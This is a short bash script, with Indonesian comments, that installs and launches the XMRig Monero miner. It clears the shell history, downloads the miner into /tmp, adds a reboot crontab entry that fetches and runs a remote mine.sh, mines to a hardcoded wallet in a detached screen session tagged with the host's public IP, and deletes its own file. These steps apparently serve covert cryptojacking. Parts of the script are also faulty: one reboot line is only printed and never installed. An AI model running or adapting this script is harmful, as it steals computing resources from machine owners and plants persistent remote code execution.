#
history -c
cd /tmp
wget https://github.com/xmrig/xmrig/releases/download/v6.10.0/xmrig-6.10.0-linux-x64.tar.gz -O /tmp/mine.tar.gz
tar -xzvf mine.tar.gz
mv /tmp/xmrig-6.10.0/xmrig /tmp/mine
rm -rf xmrig-6.10.0 mine.tar.gz
cd /home
#run after rebot
#ganti wget (url) dengan url file lu
if crontab -l | grep "@reboot && wget sgdo.myvpserv.ml/mine.sh bash mine.sh">/dev/null 2>&1 ; then
  echo "Cron already exist!"
  echo "Skiping..."
else
  echo "Creating crontab run after reboot.."
  echo "@reboot /usr/bin/wget -p /tmp https://raw.githubusercontent.com/nacht0141/miner/master/mine.sh" | crontab -
  echo "@reboot /bin/bash /tmp/mine.sh"
fi
#start mining
printf "starting mining....\nkirim command screen -r untuk melihat mining\nctrl +D untuk keluar tanpa menghapus session\n"
cd /tmp
ip=$(curl -s https://checkip.amazonaws.com | sed 's/\./_/g')
screen -dmS mnxmr ./mine -o sg.minexmr.com:443 -u 45vCvNhSG41LKu2wZaH4bDPPKMjwBMpPWWNo6tiRkgznN47ybvPoYbRht8GeXZ6v691P6tukYnh3i412mUKmn3Ey1Za3vma -k --tls --rig-id $ip
#
rm -f mine.sh
